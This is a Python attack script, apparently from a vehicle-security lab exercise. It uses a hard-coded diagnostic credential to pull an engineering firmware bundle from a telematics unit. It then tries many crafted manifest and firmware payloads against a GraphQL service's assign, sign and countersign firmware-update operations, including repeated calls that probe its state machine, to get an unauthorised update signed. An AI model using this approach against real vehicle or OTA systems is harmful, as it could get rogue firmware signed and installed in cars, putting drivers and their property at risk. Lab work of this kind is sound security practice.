#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Stage N: submit the bundle MANIFEST itself as the signing input.

The manifest fields (format / cipher / nonce / tboxAddress / tboxArchitecture /
tboxSha256 / tboxSize / vcuReferenceSize / vcuRollback / vcuUpdateAddress) are
exactly the "update campaign" descriptor a TSP would validate before signing.
Try the manifest flattened into variables, nested, and as a JSON string, and
also try the assign -> sign -> countersign sequence.
"""
import base64, hashlib, io, json, os, time, zipfile
import requests

HERE = os.path.dirname(os.path.abspath(__file__))
EV = os.path.abspath(os.path.join(HERE, "..", "..", "03_EVIDENCE", "sign"))
VIN = "CV622697F82A936A1"
CAMP = "CAMP-243892C376D4CB2D5F826953"
CRED = "5e7f07b4a81153ecd5868cc02557f823"
TB = "http://10.225.139.3:8080"
TSP = "http://10.225.139.2:8080/graphql"
OPS = ["assignFirmwareUpdate", "signFirmwareUpdate", "countersignFirmwareUpdate"]

s = requests.Session()
s.auth = ("diag", CRED)
r = s.get(TB + "/api/v1/ota/engineering-bundle", timeout=20)
z = zipfile.ZipFile(io.BytesIO(r.content))
MAN = json.loads(z.read("manifest.json"))
VCU = z.read("vcu-reference.bin")
VCU_SHA = hashlib.sha256(VCU).hexdigest()
VCU_B64 = base64.b64encode(VCU).decode()
print("[*] manifest:", json.dumps(MAN))


def gql(op, v):
    r = s.post(TSP, json={"query": op, "variables": v}, timeout=12)
    return r.status_code, r.text.strip()


flat = dict(MAN)
flat.update({"vin": VIN, "campaignId": CAMP, "sha256": VCU_SHA, "digest": VCU_SHA,
             "size": 1024, "length": 1024, "firmware": VCU_B64, "image": VCU_B64,
             "payload": VCU_B64, "vcuReference": VCU_B64})
# numeric-typed variants (manifest ships sizes as numbers, addresses as strings)
flat2 = {k: (int(v) if isinstance(v, (int,)) else v) for k, v in flat.items()}

CASES = [
    ("manifest-flat", flat),
    ("manifest-flat+vcu", flat2),
    ("manifest-nested", {"vin": VIN, "campaignId": CAMP, "manifest": MAN,
                         "update": MAN, "sha256": VCU_SHA, "firmware": VCU_B64}),
    ("manifest-jsonstring", {"vin": VIN, "campaignId": CAMP,
                             "manifest": json.dumps(MAN), "sha256": VCU_SHA}),
    ("vcu-triple", {"vin": VIN, "campaignId": CAMP, "vcuRollback": 2,
                    "vcuReferenceSize": 1024, "vcuUpdateAddress": "0x08040000",
                    "vcuReference": VCU_B64}),
    ("vcu-triple+sha", {"vin": VIN, "campaignId": CAMP, "vcuRollback": 2,
                        "vcuReferenceSize": 1024, "vcuUpdateAddress": "0x08040000",
                        "vcuReference": VCU_B64, "vcuSha256": VCU_SHA}),
    ("manifest+vin-only", {**MAN, "vin": VIN}),
    ("cipher-format", {"vin": VIN, "cipher": MAN["cipher"], "format": MAN["format"],
                       "campaignId": CAMP}),
]

print("\n=== single-shot cases ===")
for name, v in CASES:
    for op in OPS:
        st, txt = gql(op, v)
        tag = "SAME" if "update campaign validation failed" in txt else "DIFF"
        print(f"  {tag} {op:24s} {name:22s} {st} {txt[:150]}")

print("\n=== sequence on a fresh bundle (assign -> sign -> countersign) x3 ===")
for i in range(3):
    r = s.get(TB + "/api/v1/ota/engineering-bundle", timeout=20)
    z = zipfile.ZipFile(io.BytesIO(r.content))
    m = json.loads(z.read("manifest.json"))
    v = {**m, "vin": VIN, "campaignId": CAMP, "sha256": VCU_SHA}
    print(f"  -- round {i} nonce={m['nonce']}")
    for op in OPS:
        st, txt = gql(op, v)
        print(f"     {op:24s} {st} {txt[:120]}")
        time.sleep(0.3)

print("\n=== repeat sign 8x (call-count / state machine?) ===")
for i in range(8):
    st, txt = gql("signFirmwareUpdate", {"vin": VIN})
    print(f"  {i}: {st} {txt[:110]}")

print("\n=== objectives/final before-after ===")
r = s.get("http://10.225.139.2:8080/api/v1/objectives/final", timeout=10)
print("  final:", r.status_code, r.text.strip()[:120])
json.dump({"manifest": MAN, "vcu_sha256": VCU_SHA},
          open(os.path.join(EV, "N_manifest_attempt.json"), "w"), indent=1)
